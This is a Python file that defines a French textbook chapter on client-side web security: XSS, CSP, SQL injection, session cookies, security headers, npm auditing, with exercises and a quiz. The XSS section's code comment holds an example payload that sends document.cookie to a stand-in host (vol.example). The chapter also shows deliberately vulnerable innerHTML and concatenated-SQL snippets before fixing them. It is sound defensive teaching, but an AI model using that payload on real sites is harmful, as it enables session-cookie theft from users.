from bookkit.dsl import (box, code, defn, ex, fig, h, ol, p, quiz, table, ul)

CH = {
    "title": "Sécurité côté client",
    "subtitle": "Connaître les attaques qui visent le navigateur et les quelques "
                "réflexes qui en neutralisent la majorité.",
    "duration": "2 h 45",
    "level": "Intermédiaire",
    "prereq": "chapitre 33",
    "objectives": [
        "Identifier les trois grandes familles d'attaques web.",
        "Neutraliser une injection HTML et une injection SQL.",
        "Comprendre le rôle de la politique de sécurité du contenu.",
        "Protéger une session et un formulaire.",
        "Intégrer la sécurité dans le cycle de développement.",
    ],
    "blocks": [
        h(2, "Le modèle de menace"),
        p("Un site front-end s'exécute dans un environnement hostile : l'utilisateur "
          "contrôle son navigateur, le réseau est observable, et toute donnée reçue "
          "peut être piégée. La sécurité consiste à réduire la surface d'attaque."),
        fig("columns", "Trois surfaces d'attaque",
            [("Entrées", ["Formulaires", "Paramètres d'URL", "En-têtes"]),
             ("Sorties", ["HTML généré", "Attributs", "Messages d'erreur"]),
             ("Session", ["Cookies", "Jetons", "Stockage local"])],
            height=200),
        defn("Surface d'attaque", "Ensemble des points par lesquels un attaquant peut "
                                  "tenter d'entrer ou d'extraire des données."),

        h(2, "Injection HTML et XSS"),
        p("Une faille XSS consiste à faire exécuter du script hostile dans la page d'un "
          "autre utilisateur. Elle survient dès qu'une donnée non fiable est insérée "
          "comme du HTML."),
        code("""// Vulnérable : la donnée est interprétée comme du HTML
const nom = new URLSearchParams(location.search).get("nom");
resultat.innerHTML = `Bonjour ${nom}`;
// URL : ?nom=<img src=x onerror="fetch('https://vol.example/?c='+document.cookie)">

// Sûr : texte brut
resultat.textContent = `Bonjour ${nom}`;""", "js", "La faille la plus courante"),
        table(["Contexte", "Danger", "Protection"],
              [["Contenu HTML", "Balise injectée", "`textContent`"],
               ["Attribut", "Guillemet cassé", "`setAttribute`"],
               ["URL", "`javascript:`", "Validation du protocole"],
               ["CSS", "`url()` piégée", "Classes statiques"],
               ["Script", "Donnée exécutée", "`JSON.stringify` échappé"]],
              widths=[3.2, 4.0, 4.6], first_col_bold=True,
              caption="Cinq contextes d'insertion"),
        box("attention", "Ne construisez jamais de HTML par concaténation",
            "`element.innerHTML = \"<p>\" + donnee + \"</p>\"` est une faille dès que "
            "`donnee` vient de l'utilisateur. Utilisez `textContent`, `createElement` "
            "ou un moteur de gabarit qui échappe automatiquement."),
        code("""// Vérifier un protocole d'URL avant de l'utiliser
function urlSûre(valeur) {
  try {
    const url = new URL(valeur, location.origin);
    return ["http:", "https:", "mailto:"].includes(url.protocol) ? url.href : "#";
  } catch {
    return "#";
  }
}

lien.href = urlSûre(donnee);
// javascript:alert(1) devient "#\"""", "js", "Un filtre de protocole"),
        p("Les attributs `onerror`, `onload` et `srcdoc` sont des vecteurs classiques. "
          "Une politique de sécurité du contenu les bloque même si une injection "
          "parvient à passer."),

        h(2, "Politique de sécurité du contenu"),
        p("La CSP est un en-tête HTTP qui liste les sources autorisées pour chaque type "
          "de ressource. C'est la seconde ligne de défense : même injecté, un script "
          "non autorisé ne s'exécute pas."),
        code("""Content-Security-Policy:
  default-src 'self';
  img-src 'self' data: https://images.exemple.fr;
  style-src 'self' 'unsafe-inline';
  script-src 'self' https://stats.exemple.fr;
  connect-src 'self' https://api.exemple.fr;
  font-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'""", "http", "Une CSP réaliste"),
        code("""<!-- Signaler les violations sans bloquer, pendant la mise au point -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; report-uri /csp-report">""", "html",
             "Une politique de test"),
        table(["Directive", "Limite", "Effet d'un dépassement"],
              [["`script-src`", "Scripts exécutables", "Blocage"],
               ["`style-src`", "Feuilles et styles en ligne", "Blocage"],
               ["`img-src`", "Images", "Image non chargée"],
               ["`connect-src`", "`fetch`, WebSocket", "Requête bloquée"],
               ["`frame-ancestors`", "Intégration en iframe", "Blocage"],
               ["`form-action`", "Cible d'un formulaire", "Envoi bloqué"]],
              widths=[3.6, 4.6, 3.6], first_col_bold=True,
              caption="Six directives essentielles"),

        h(2, "Injection SQL"),
        p("L'injection SQL ne se produit pas dans le navigateur, mais un formulaire "
          "mal traité y conduit. Le principe est le même : une donnée devient du code."),
        code("""-- Vulnérable : concaténation
SELECT * FROM utilisateurs WHERE email = '" + email + "';

-- Sûre : requête paramétrée
SELECT * FROM utilisateurs WHERE email = $1;""", "sql",
             "Deux écritures, deux comportements"),
        p("Le front-end ne peut pas protéger une base de données. Il doit en revanche "
          "ne jamais transmettre de données structurées par un canal qui les "
          "interprète, et le serveur doit utiliser des requêtes préparées."),
        box("retenir", "La validation n'est pas une protection",
            "Valider une entrée côté client améliore l'expérience. Ce n'est jamais une "
            "barrière de sécurité : un attaquant envoie ce qu'il veut directement au "
            "serveur. Toute validation doit être répétée côté serveur."),

        h(2, "Sessions et formulaires"),
        table(["Mesure", "Protège contre", "Mise en œuvre"],
              [["Cookie `HttpOnly`", "Vol par script", "En-tête `Set-Cookie`"],
               ["Cookie `Secure`", "Interception réseau", "HTTPS uniquement"],
               ["Cookie `SameSite=Lax`", "Requêtes croisées", "Attribut du cookie"],
               ["Jeton anti-CSRF", "Soumission forgée", "Champ caché vérifié"],
               ["HTTPS partout", "Écoute passive", "Redirection + HSTS"],
               ["Limitation de débit", "Force brute", "Côté serveur"]],
              widths=[3.6, 4.0, 4.2], first_col_bold=True,
              caption="Six protections de session"),
        defn("CSRF", "Cross-Site Request Forgery : un site tiers déclenche une requête "
                     "authentifiée vers votre application, en profitant des cookies "
                     "envoyés automatiquement."),
        code("""# En-têtes de sécurité d'une application web
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
X-Frame-Options: DENY""", "http", "Quatre en-têtes, quatre protections"),
        p("`X-Content-Type-Options: nosniff` empêche le navigateur de deviner un type "
          "MIME, ce qui bloque certaines attaques par fichier déguisé. "
          "`Referrer-Policy` limite les fuites d'URL vers les sites tiers."),

        h(2, "Dépendances et chaîne d'approvisionnement"),
        p("La majorité du code exécuté dans un projet vient de dépendances externes. "
          "Une bibliothèque compromise contamine tous ses utilisateurs."),
        code("""npm audit                    # vulnérabilités connues
npm outdated                 # versions obsolètes
npm ci                       # installation reproductible depuis le verrou
npm ls --all                 # arbre complet des dépendances""", "bash",
             "Quatre commandes d'hygiène"),
        table(["Risque", "Symptôme", "Réponse"],
              [["Dépendance vulnérable", "Alerte `npm audit`", "Mettre à jour"],
               ["Paquet malveillant", "Nom proche d'un paquet connu", "Vérifier l'éditeur"],
               ["Version non figée", "Résultat différent selon la machine", "Verrouiller"],
               ["Script d'installation", "Exécution à l'installation", "Auditer, restreindre"]],
              widths=[4.0, 4.4, 3.4], first_col_bold=True,
              caption="Quatre risques de dépendance"),
        box("methode", "Sécurité, quatre réflexes quotidiens",
            items=["Traiter toute entrée comme hostile.",
                   "Insérer par `textContent`, jamais par concaténation HTML.",
                   "Servir tout le site en HTTPS.",
                   "Mettre à jour les dépendances chaque mois."]),
    ],
    "keypoints": [
        "Une XSS survient quand une donnée devient du HTML.",
        "`textContent` neutralise l'injection de balises.",
        "Une CSP bloque les scripts non autorisés.",
        "Les cookies `HttpOnly`, `Secure` et `SameSite` protègent la session.",
        "La validation côté client ne remplace pas la validation serveur.",
        "Les en-têtes de sécurité limitent plusieurs classes d'attaque.",
        "Les dépendances font partie de la surface d'attaque.",
    ],
    "bridge": "Le code est sûr et mesuré. Il reste à le versionner, le construire et "
              "le livrer : c'est l'objet des deux derniers chapitres.",
    "exercises": [
        ex("Neutraliser une injection",
           "Ce code affiche un commentaire reçu d'une API.",
           ["`zone.innerHTML = commentaire.texte`",
            "Le commentaire contient `<script>alert(1)</script>`",
            "Corrigez sans perdre la mise en forme du texte."],
           [("code", """// Plusieurs paragraphes, sans interpréter le HTML
const paragraphes = commentaire.texte.split("\\n").filter(Boolean);
zone.replaceChildren(
  ...paragraphes.map((texte) => {
    const p = document.createElement("p");
    p.textContent = texte;
    return p;
  })
);"""),
            "`textContent` affiche les balises comme du texte : le script n'est jamais "
            "exécuté.",
            "Découper en paragraphes restitue la mise en forme sans recourir au HTML "
            "brut."]),
        ex("Rédiger une CSP",
           "Le site charge des images locales, une police auto-hébergée et un script "
           "d'analyse externe.",
           ["Autorisez uniquement le nécessaire.",
            "Bloquez l'intégration en iframe.",
            "Prévoyez un rapport de violation."],
           [("code", """default-src 'self';
img-src 'self' data:;
style-src 'self';
script-src 'self' https://stats.exemple.fr;
font-src 'self';
connect-src 'self';
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
report-uri /api/csp-report"""),
            "`default-src 'self'` ferme tout par défaut ; chaque directive n'ouvre que "
            "ce qui est nécessaire.",
            "`frame-ancestors 'none'` empêche le détournement par iframe "
            "(clickjacking)."],
           level="Sécurité"),
        ex("Auditer les dépendances",
           "Un audit signale plusieurs vulnérabilités.",
           ["Classez par gravité.",
            "Distinguez correctif direct et indirect.",
            "Planifiez la mise à jour."],
           [("code", """# Identifier l'origine d'une dépendance transitive
npm ls paquet-vulnerable

# Mettre à jour dans les limites du verrou sémantique
npm update

# Corriger les vulnérabilités connues, y compris majeures
npm audit fix

# Vérifier après correction
npm audit --audit-level=high"""),
            "Une vulnérabilité transitive se corrige souvent en mettant à jour la "
            "dépendance directe qui l'introduit.",
            "Une mise à jour majeure exige des tests : ne l'appliquez pas en production "
            "sans vérification."]),
    ],
    "quiz": [
        quiz("Quelle faille permet d'exécuter du script dans la page d'un autre utilisateur ?",
             ["CSRF", "XSS", "Injection SQL", "Clickjacking"],
             1,
             "Une XSS injecte du code exécuté dans le contexte de la page."),
        quiz("Quelle propriété insère du texte sans interpréter les balises ?",
             ["`innerHTML`", "`textContent`", "`outerHTML`", "`document.write`"],
             1,
             "`textContent` traite la donnée comme du texte brut."),
        quiz("À quoi sert la CSP ?",
             ["À chiffrer les données", "À restreindre les sources de ressources",
              "À accélérer le site", "À compresser les images"],
             1,
             "Elle liste les origines autorisées et bloque le reste."),
        quiz("Quel attribut de cookie le rend inaccessible au JavaScript ?",
             ["`Secure`", "`SameSite`", "`HttpOnly`", "`Path`"],
             2,
             "`HttpOnly` empêche la lecture par `document.cookie`."),
        quiz("La validation côté client suffit-elle à protéger un serveur ?",
             ["Oui", "Non, elle doit être répétée côté serveur",
              "Oui si le formulaire est en HTTPS", "Oui avec une CSP"],
             1,
             "Un attaquant peut envoyer directement les données au serveur."),
    ],
}
